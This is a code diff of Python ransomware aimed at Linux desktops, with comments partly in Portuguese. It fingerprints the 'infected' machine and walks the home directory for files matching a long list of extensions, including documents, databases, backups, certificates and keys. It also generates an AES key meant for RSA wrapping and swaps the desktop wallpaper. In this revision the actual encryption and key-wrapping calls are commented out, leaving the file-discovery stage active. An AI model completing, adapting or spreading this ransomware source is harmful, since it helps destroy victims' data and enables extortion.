@@ -11,13 +11,17 @@ import sys
 import json
 import subprocess
 import hashlib
+import time
 
 from AES import *
 from RSA import *
 from SRSA import *
 
-# classe da vitma que foi infectada
-class infectado():
+
+file_types = '''.doc .docx .xls .xlsx .ppt .pptx .pst .ost .msg .eml .vsd .vsdx .txt .csv .rtf .wks .wk1 .pdf .dwg .onetoc2 .snt .jpeg .jpg .docb .docm .dot .dotm .dotx .xlsm .xlsb .xlw .xlt .xlm .xlc .xltx .xltm .pptm .pot .pps .ppsm .ppsx .ppam .potx .potm .edb .hwp .602 .sxi .sti .sldx .sldm .sldm .vdi .vmdk .vmx .gpg .aes .ARC .PAQ .bz2 .tbk .bak .tar .tgz .gz .7z .rar .zip .backup .iso .vcd .bmp .png .gif .raw .cgm .tif .tiff .nef .psd .ai .svg .djvu .m4u .m3u .mid .wma .flv .3g2 .mkv .3gp .mp4 .mov .avi .asf .mpeg .vob .mpg .wmv .fla .swf .wav .mp3 .sh .class .jar .java .rb .asp .php .jsp .brd .sch .dch .dip .pl .vb .vbs .ps1 .bat .cmd .js .asm .h .pas .cpp .c .cs .suo .sln .ldf .mdf .ibd .myi .myd .frm .odb .dbf .db .mdb .accdb .sql .sqlitedb .sqlite3 .asc .lay6 .lay .mml .sxm .otg .odg .uop .std .sxd .otp .odp .wb2 .slk .dif .stc .sxc .ots .ods .3dm .max .3ds .uot .stw .sxw .ott .odt .pem .p12 .csr .crt .key .pfx .der'''
+
+# infected victim class
+class infected():
     def __init__(self):
         self.nome_pc = None
         self.id = None
@@ -33,8 +37,8 @@ class infectado():
         self.mac_addr = self.s[1]
         self.id = hashlib.sha256(self.mac_addr).hexdigest()
 
-# função que cadastra o usuario e salva como json para enviar para o servidor.
-def get_usuario():
+
+def get_user():
     caminho = os.environ['HOME']+'/Desktop/'
     caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
     if(os.path.isdir(caminho)):
@@ -42,7 +46,7 @@ def get_usuario():
     elif(os.path.isdir(caminho2)):
         caminho_correto = caminho2
 
-    usuario = infectado()
+    usuario = infected()
     usuario.get_name()
     nome_pc = usuario.nome_pc
     print(nome_pc)
@@ -70,18 +74,16 @@ NOVAS COISAS :
     trocar o wallpaper dnv
 '''
 
-# ponto de partida da criptografia
+# Starting point of encrypting
 def menu(senha_AES):
-    f = open('type.txt')
-    tipos = f.read()
-    tipos_arquivos = tipos.split('\n')
-    tipos_arquivos.remove('')
-    # caminho de partida
-    home = os.environ['HOME']
-    listar(senha_AES,home,tipos_arquivos)
+    tipos_arquivos = file_types.split(' ')
+    home = os.environ['HOME'] # /home/user is the start point
+    comeco = time.time()
+    listar(senha_AES, home, tipos_arquivos)
+    print(time.time()-comeco)
     #listar_media(senha_AES,tipos_arquivos)
 
-# função que lista e criptografa HD'S externos e pendrives
+# look's for external media such as usb / hd's
 def listar_media(senha_AES, tipos_arq):
     print('Procurando por pendrives/HDs')
     caminho = '/media/'+getpass.getuser()
@@ -89,36 +91,33 @@ def listar_media(senha_AES, tipos_arq):
         listar(senha_AES,caminho,tipos_arq)
 
 
-# função que lista todos os arquivos e criptografa
+# lists and encrypt files
 def listar(chave_AES,diretorio, tipos_arq):
-    atual = os.getcwd()
     ignorar = diretorio + '/.avfs'
-    listagem_dos_diretorios = os.listdir(os.environ['HOME'])
+    home = os.environ['HOME']
+    listagem_dos_diretorios = os.listdir(diretorio)
     for elemento in listagem_dos_diretorios:
         if(elemento == '.avfs'):
-            listagem_dos_diretorios.remove('.avfs') # remorção de diretorio virtual
+            listagem_dos_diretorios.remove('.avfs') # remove virtual directory
 
-    for elemento in listagem_dos_diretorios:
-        for caminho, diret, arquivo in elemento:
+    encrypt_list = [] # list of files found
+    for elemento in listagem_dos_diretorios: # start looking throught the home directory of the user
+        for caminho, diret, arquivo in os.walk(os.path.join(home, elemento)):
             for arq in arquivo:
-                a = caminho+'/'+arq
-                extensao = os.path.splitext(a)
+                file_found = os.path.join(caminho, arq)
+                extensao = os.path.splitext(file_found)
                 for ext in tipos_arq:
-                    if(extensao[1] == ext):
-                        if(caminho == atual):
-                            ignorar = 1
-                        else:
-                            a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                            try:
-                                pass
-                                #criptografa(chave_AES, a)
-                            except:
-                                print('erro ao criptografar-> ' +str(a))
-
-
-
-
-# GERA SENHA AES que vai criptografar os arquivos
+                    if(extensao[1] == ext): # found file with the extension
+                        encrypt_list.append(file_found)
+    print(len(encrypt_list))
+'''
+    for element in encrypt_list: # encrypt happens here
+        try:
+            criptografa(chave_AES , element)
+        except:
+            print('Error Encrypting file: '+ element)
+'''
+# Generate random AES key for each infection
 def gera_chave_AES():
     caminho = os.environ['HOME']+'/Desktop/'
     caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
@@ -137,26 +136,25 @@ def gera_chave_AES():
         f.write(senha)
     return senha
 
-# função que troca o plano de fundo do compiuter
+# change the backgroud of the computer
 def change_background():
     os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')
 
-# função que criptografa tudo
 def crypto_all():
     AES_key = gera_chave_AES()
     print('[*] Chave AES gerada')
-    menu(AES_key) # -> criptografa tudo
-    AES_to_RSA()
+    menu(AES_key) # -> Encrypt everything
+    '''AES_to_RSA()
     print('[*] Senha AES criptografado com chave RSA')
     RSA_to_SRSA()
     print('[*] Chave privada do cliente criptografada')
-
+'''
 
 # MAIN
 if __name__ == "__main__":
     crypto_all()
-    change_background()
-    #get_usuario()
+    #change_background()
+    #get_user()
     #pass
 
 
